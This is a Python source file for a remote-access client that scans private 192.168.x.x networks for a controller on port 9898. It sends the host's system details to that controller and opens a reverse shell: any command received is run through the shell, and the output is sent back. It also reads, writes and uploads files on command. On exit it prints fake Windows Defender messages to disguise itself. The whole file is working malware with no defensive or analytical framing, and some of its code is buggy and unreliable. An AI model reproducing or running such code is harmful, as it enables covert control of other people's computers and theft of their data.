import socket
import os
import subprocess
# import re
import sys
import time
import platform, socket, re, uuid, json, logging

# import  psutil
s = socket.socket()
device_name = socket.gethostname()
host = socket.gethostbyname(device_name)  # '127.0.0.1'
port = 9898
# server_addr = (host, port)
# s.connect(server_addr)
# port = socket.getprotobyname('127.0.0.1')
respone_size = 30000
TO_EXIT_CHECK = False
isConnected = False


def getSystemInfo():
    # print(str('ram :' + str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB"))#out  , remove
    try:
        info = {
            'platform': platform.system(), 'platform-release': platform.release(),
            'platform-version': platform.version(), 'architecture': platform.machine(),
            'hostname': socket.gethostname(), 'ip-address': socket.gethostbyname(socket.gethostname()),
            'mac-address': ':'.join(re.findall('..', '%012x' % uuid.getnode())),
            'processor': platform.processor(),
            # 'ram': str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB"}
            'ram': "ram is not available for some reasons..."
        }
        return json.dumps(info)
    except Exception as e:
        logging.exception(e)


def write_data_to_file():
    FILE_RESPONSE_SIZE = 30000
    s.send(str.encode('Enter file name with in the local directory... : '))
    file_name = s.recv(5000).decode('utf-8')
    f = open(file_name, 'w')
    print('File Location in this Device : [FILE-LOCATION] ', __file__)
    print('Current working directory : [CURRENT-DIRECTORY]', os.getcwd())
    OF = f"THIS ***[ {file_name} ]*** FILE...."
    o = "--------To Stop Editing File , Then end the text with ---'*'---" + '\n' + 'Type a sentence and end it with an *' + '\n' + 'Enter your text ....' + '\n' + "******************---------------[WARNING]-------------***************" + '\n' + "----FIRST LINE IS YOUR TRAIL , FIRST LINE WON'T ADDED TO" + OF + "FROM SECOND LINE ONWARDS , DATA WILL SAVES INTO " + OF
    s.send(str.encode(
        o
    ))
    print('method *')
    global exit_to_write
    exit_to_write = False
    print('strt input ....')
    data_ = s.recv(FILE_RESPONSE_SIZE).decode('utf-8')
    # data_ = str(input('Type a sentence and end it with an *'))
    file_written_data = ""
    print(data_[-1], type(data_))
    fd = "Python Generated Text...."
    fg = [fd]

    def wr(file_d):
        f.write(file_d + '\n')

    while data_[-1] != '*':
        print('while strt')
        s.send(str.encode('ok....'))
        data_ = s.recv(FILE_RESPONSE_SIZE).decode('utf-8')
        print('sent...')
        # data_ = str(input('Enter your Text...'))
        file_written_data = data_
        print(file_written_data)
        wr(file_written_data)
        FILE_RESPONSE_SIZE += 10000
        fg.append(file_written_data)
    file_written_data = file_written_data + '\n' + data_[:-1]
    # f.write(file_written_data)
    wr(file_written_data)
    print(file_written_data + '\n' + 'written...')
    print('fg : ', fg)
    f.close()
    s.send(str.encode('Successfully data is save & file is safely closed'))


def client_main_choice():
    if data[:2].decode('utf-8') == "cd":
        os.chdir(data[3:].decode('utf-8'))
    if len(data) > 0:
        if data.decode('utf=8') == "copy_img":
            copy_img_worker()

        if data.decode('utf-8') == "edit":
            # s.send(str.encode(input('Enter file name with in the local directory... : ')))
            # s.send(file_name = str(input('Enter file name with in the local directory... : ')))
            # while True:
            #     edit_file()
            #     break
            # s.send(str.encode('Enter file name with in the local directory... : '))
            # file_name = s.recv(1024).decode('utf-8')
            # f = open(file_name, 'w')
            # s.send(str.encode(
            #     "--------To Stop Editing File , Then end the text with ---'*'---" + "\n" + ('Enter your text ....'))
            # )
            # global exit_to_write
            # exit_to_write = True
            # while exit_to_write:
            try:
                write_data_to_file()  # s.recv(respone_size).decode('utf-8')
            except:
                Wmsg = "UNKNOWN ERROR , RETRYING......"
                war = "*****************ERROR IN WRITING DATA INTO FILES**************************"
                war_msg = war + '\n' + Wmsg
                s.send(str.encode(war_msg))
        if data.decode('utf-8') == "read":
            # file_name = str(input('Enter file name with in the local directory... : '))
            s.send(str.encode('Enter file name with in the local directory... : '))
            file_name = s.recv(respone_size).decode('utf-8')
            # s.send(str.encode(read_file_as_text(file_name)))
            try:
                f = open(file_name, 'r')
                d = f.read()
                MSG_R_D = "--------------------------------DATA FROM FILE------------------------------------------"
                MASG_TO_GO = MSG_R_D + '\n' + d + '\n' + MSG_R_D
                s.send(str.encode(MASG_TO_GO))
            except f.errors as Rmsg:
                war = "*****************ERROR IN READING DATA IN FILES*************************"
                war_msg = war + '\n' + Rmsg
                s.send(str.encode(war_msg))
        if data.decode('utf-8') == "device_info":
            try:
                MSG_SYS_UP = "------------------------SYSTEM INFORMATION-----------------------" + '\n'
                MSG_SYS_DWN = "----------------------------------------------------------------"
                # MSG_SYS_SEND: MSG_SYS_UP + str(json.loads(getSystemInfo())) + MSG_SYS_DWN
                MSG_SYS_SEND: MSG_SYS_UP + str(getSystemInfo()) + MSG_SYS_DWN
                s.send(str.encode(MSG_SYS_SEND))
                # print(json.loads(getSystemInfo()))
            except Exception as e:
                print("Error at fetching system info.....")
                s.send(str.encode("Error at fetching system info.....", str(Exception.__cause__)))
        if data.decode('utf-8') == 'quit_app':
            s.send(str.encode("COMMAND ACCEPTED,CLOSING THE CONNECTION AND APPLICATION , BYE :))"))
            s.close()
            print("WINDOWS SECURITY DEFENDER,VIRUS TRACKING UPDATED SUCCESSFULLY...")
            print("LOOKS NO NEW UPDATE FOUND IN OUR SERVERS... , THANKS FOR CHOOSING WINDOWS. :)")
            print('This terminal closes in next 6 seconds....')
            time.sleep(6)
            sys.exit()
            global TO_EXIT_CHECK
            TO_EXIT_CHECK = True

        if data.decode('utf-8') != "edit" and data.decode('utf-8') != "read" and data.decode(
                'utf-8') != "device_info" and data.decode('utf-8') != "quit_app":
            cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()  # return bytes
            output_str = str(output_byte, 'utf-8')
            current_dir = os.getcwd() + ">"
            dir_out_ = "|CURRENT WORKING DIRECTORY | " + output_str + current_dir
            s.send(str.encode(dir_out_))
            print(output_str)
            print('===========================================================')
            # read_file_as_text('h.txt')


def copy_img_worker():
    global respone_size
    respone_size = 50000
    s.send(
        str.encode('Enter file name with in the local directory... [img response size changed to 10000000(10mb)] : '))
    file_name = s.recv(respone_size).decode('utf-8')
    FReader = open(str(file_name), 'rb')
    print(FReader.read())
    respone_size = 100000000000000000000
    #respone_size=108000
    IMG_DATA = str(FReader.read())
    FReader.close()
    s.send(str.encode("CI-000"))
    CI_COMMAND=s.recv(respone_size).decode('utf-8')
    print(CI_COMMAND)
    if s.recv(respone_size).decode('utf-8').__eq__("CI-000-accepted"):
        s.send(str.encode(file_name))
        if s.recv(respone_size).decode('utf-8').__eq__("ID-ACCEPTED"):
            s.send(str.encode(IMG_DATA))


# Make a regular expression
# for validating an Ip-address
# regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
# Define a function for
# validate an Ip address
# def check(Ip):
#     # pass the regular expression
#     # and the string in search() method
#     if (re.search(regex, Ip)):
#         True
#     else:
#         False
def Server_Client_Connection_Main(ip):
    global host, data, respone_size
    close_conn = False
    try:
        socket.inet_aton(ip)
        # legal
        host = ip
        server_addr = (host, port)
        s.connect(server_addr)
        close_conn = True
    except socket.error:
        # Not legal
        if not close_conn:
            s.send(str.encode("ERROR....... CAN NOT TRY AGAIN......, CLOSING CONNECTION...."))
            print("Seems its Invalid Ip Address")
            print("Try Again..... , by double clicking file or run it in cmd")
            print('This terminal closes in next 6 seconds....')
            s.close()
            time.sleep(6)
            exit()
        else:
            pass
    s.send(str.encode(getSystemInfo()))
    while True:
        respone_size += 20000
        data = s.recv(10000)
        try:
            client_main_choice()
        except:
            s.send(str.encode(
                "----------------------------------------"
                "*****************LOOKS LIKE WE FELL INTO AN ERROR LIKE [FILE NOT FOUND , CREATING NEW FILE{WITH "
                "SAME NAME'S} , VIEWING ,ETC....] , RETRYING...... ****************"
                "------------------------------------"
            ))
            # Server_Client_Connection_Main(ip=ip)
            WAR = "***************---------WARNING-----------*******************"
            MSG_SERIOUS = "*****************LOOKS LIKE WE FELL INTO SERIOUS ERROR, CAN NOT TRY AGAIN......CLOSING " \
                          "THE " \
                          "CONNECTION WITH IN 3 SECONDS..... **************** RETRYING..... TO CONNECT "
            MAIN_MSG_TO_SEND = WAR + "\n" + MSG_SERIOUS + "\n" + WAR
            s.send(str.encode(MAIN_MSG_TO_SEND))
            Server_Client_Connection_Main(ip=ip)
            return True


ip1 = '192.168.0.101'
ip2 = '192.168.0.102'
ip3 = '192.168.0.103'
ip4 = '192.168.0.104'
ip5 = '192.168.0.105'
ip6 = '192.168.0.106'
ip7 = '192.168.0.107'
ip8 = '192.168.0.108'
ip9 = '192.168.0.109'
ip11 = '192.168.0.111'
ip_s = [ip1, ip2, ip3, ip4, ip5, ip6, ip7, ip8, ip9, ip11]


def ips():
    global host, port, ip_s
    print(host)
    # ip_s = []
    # ip_s = ["192.168.0.108","192.168.0.107"]
    print(ip_s)
    def connect(l):
        global TO_EXIT_CHECK,isConnected
        if TO_EXIT_CHECK:
            exit(0)
        #for conn in range(len(ip_s)):
        # for cc in range(300):
            # try:
            #     global ip
            #     print("ip-conn:", ip_s[conn])
            #     if l:
            #         if len(ip_s) != 1:
            #             ip = ip_s[conn] - 1
            #         else:
            #             ip = ip_s[conn]
            #     server_addr = (ip_s[conn], port)
            #     print(server_addr)
            #     # s.connect(server_addr)
            #     Server_Client_Connection_Main(ip=ip)
            #     print('connected')
            # except:
            #     if TO_EXIT_CHECK:
            #         exit()
            #     # if cc == 300:
            #     print('conn:', ip_s[conn])
            #     ip_s.remove(ip_s[conn])
            #     print('removed ', ip_s, '/n', 'r = ', ip_s[conn], 'type:', type(ip_s[conn]), type(ip_s[conn]))
            #     print("starting connect@")
            #     connect(l=True)

        if not isConnected:
            for iinips in range(225):
                ipin1 = iinips
                # print('main ip : ', ipin1)
                for jinips in range(100,225):
                    ipin2 = jinips
                    # print('sub ip : ', ipin2)
                    finalIp = '192.168.' + str(ipin1) + '.' + str(ipin2)
                    try:
                        # global ip
                        server_addr = (finalIp, port)
                        # print(server_addr)
                        # s.connect(server_addr)
                        isConnected =Server_Client_Connection_Main(ip=finalIp)
                        if isConnected:
                            break
                        print('connected')
                    except:
                        pass
                if isConnected:
                    break
    connect(l=False)


ip = ''
ips()
# try:
#     while True:
#         Server_Client_Connection_Main(ip=ip)
# except:
#     s.send(str.encode("********************ERROR*****************,MAIN-TRY-ERROR- --- CATCHING & RETRYING @ "
#                       "LAST..............."))
#     while True:
#         Server_Client_Connection_Main(ip=ip)
# if check(ip):
#
#
#
# else:
#     print("Seems its Invalid Ip Address")
#     print("Try Again..... , by double clicking file or run it in cmd")
#     exit()
# ---------------safe---code----------
# while True:
#     d = data
#     d = s.recv(respone_size).decode('utf-8')
#     if data[-1] == '*':
#         f.write(str(d))
#         s.send(str.encode('Editing File Over.... 1'))
#         f.close()
#         break
#
#     else:
#         f.write(str(d))
#         d = s.recv(10000).decode('utf-8')
#         while True:
#             if data[-1] == '*':
#                 s.send(str.encode('Editing File Over.... 2'))
#                 f.close()
#                 break
#
# +-
# +----
# +-**.
#
#
#
#
#     if data[:2].decode('utf-8') == "cd":
#         os.chdir(data[3:].decode('utf-8'))
#
#     if len(data) > 0:
#         if data.decode('utf-8') == "edit":
#             # s.send(str.encode(input('Enter file name with in the local directory... : ')))
#             # s.send(file_name = str(input('Enter file name with in the local directory... : ')))
#             # while True:
#             #     edit_file()
#             #     break
#             # s.send(str.encode('Enter file name with in the local directory... : '))
#             # file_name = s.recv(1024).decode('utf-8')
#             # f = open(file_name, 'w')
#             # s.send(str.encode(
#             #     "--------To Stop Editing File , Then end the text with ---'*'---" + "\n" + ('Enter your text ....'))
#             # )
#             # global exit_to_write
#             # exit_to_write = True
#             # while exit_to_write:
#             try:
#                 write_data_to_file()  # s.recv(respone_size).decode('utf-8')
#             except f.errors as Wmsg:
#                 war = "*****************ERROR IN WRITING DATA INTO FILES"
#                 war_msg = war + '\n' + Wmsg
#                 s.send(str.encode(war_msg))
#
#         if data.decode('utf-8') == "read":
#             # file_name = str(input('Enter file name with in the local directory... : '))
#             s.send(str.encode('Enter file name with in the local directory... : '))
#             file_name = s.recv(respone_size).decode('utf-8')
#             # s.send(str.encode(read_file_as_text(file_name)))
#             try:
#                 f = open(file_name, 'r')
#                 d = f.read()
#                 s.send(str.encode(d))
#             except f.errors as Rmsg:
#                 war = "*****************ERROR IN WRITING DATA INTO FILES"
#                 war_msg = war + '\n' + Rmsg
#                 s.send(str.encode(war_msg))
#
#         if data.decode('utf-8') != "e" and data.decode('utf-8') != "r":
#             cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
#             output_byte = cmd.stdout.read() + cmd.stderr.read()  # return bytes
#             output_str = str(output_byte, 'utf-8')
#             current_dir = os.getcwd() + ">"
#             s.send(str.encode(output_str + current_dir))
#             print(output_str)
#             print('===========================================================')
#             read_file_as_text('h.txt')


